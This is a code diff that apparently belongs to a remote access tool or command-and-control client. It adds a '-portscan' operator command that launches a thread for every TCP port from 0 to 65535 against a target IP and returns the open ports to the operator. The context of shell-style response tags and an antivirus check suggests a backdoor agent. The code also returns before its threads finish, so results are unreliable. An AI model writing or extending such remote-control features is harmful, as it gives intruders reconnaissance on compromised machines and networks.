@@ -775,6 +775,33 @@ class Client:
                     f'[@HOST_SHELL%@]An error was occurred'
             else:
                 return f'[@HOST_SHELL%@]Not windows'
+        
+        elif '-portscan' in command:
+            class port_scan:
+                def __init__(self):
+                    self.open_ports = list()
+
+                def checking_port(self, host, port):
+                    try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((host, port))
+                        self.open_ports.append(f'{host}/{port} - Open\n')
+                    except:
+                        pass
+
+                def main(self):
+                    for port_num in range(0, 65535):
+                        t = Thread(target=self.checking_port, args=(ip, port_num))
+                        t.start()
+                    return self.open_ports
+
+            start = port_scan()
+            a = start.main()
+            full = f'[@%HOST_SHELL%@]Open ports:\n\n'
+            for x in a:
+                full += x
+
+            return full
             
         elif '-antivirus' in command:
             if 'windows' in str(platform.platform()).lower():
